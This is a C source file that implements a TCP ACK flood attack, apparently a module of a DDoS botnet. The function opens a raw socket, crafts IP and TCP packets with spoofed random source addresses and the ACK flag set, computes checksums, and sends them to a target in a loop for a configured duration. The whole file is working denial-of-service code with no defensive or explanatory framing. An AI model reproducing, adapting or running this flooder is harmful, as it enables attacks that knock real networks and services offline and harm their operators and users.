#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "ack_attack.h"
#include "../headers/checksum.h"
#include "../headers/protocol.h"
#include "../headers/rand.h"

void* ack_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return NULL;

    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) < 0) {
        close(fd);
        return NULL;
    }

    int sndbuf = 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));

    struct iphdr*  ip  = (struct iphdr*)packet;
    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));

    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->tot_len  = htons(sizeof(packet));
    ip->frag_off = 0;
    ip->ttl      = 255;
    ip->protocol = IPPROTO_TCP;
    ip->daddr    = params->target_addr.sin_addr.s_addr;

    tcp->dest   = params->target_addr.sin_port;
    tcp->doff   = 5;
    tcp->ack    = 1;
    tcp->window = htons(65535);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        ip->saddr   = rand_next();        // spoof random src
        ip->id      = htons(rand_next() & 0xFFFF);
        tcp->source = htons(rand_next_range(1024, 65535));
        tcp->seq    = htonl(rand_next());
        tcp->ack_seq= htonl(rand_next());

        ip->check  = 0;
        ip->check  = generic_checksum(ip, sizeof(struct iphdr));
        tcp->check = 0;
        tcp->check = tcp_udp_checksum(tcp, sizeof(struct tcphdr), ip->saddr, ip->daddr, IPPROTO_TCP);

        sendto(fd, packet, sizeof(packet), MSG_NOSIGNAL, (struct sockaddr*)&dest, sizeof(dest));

        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
    }

    close(fd);
    return NULL;
}
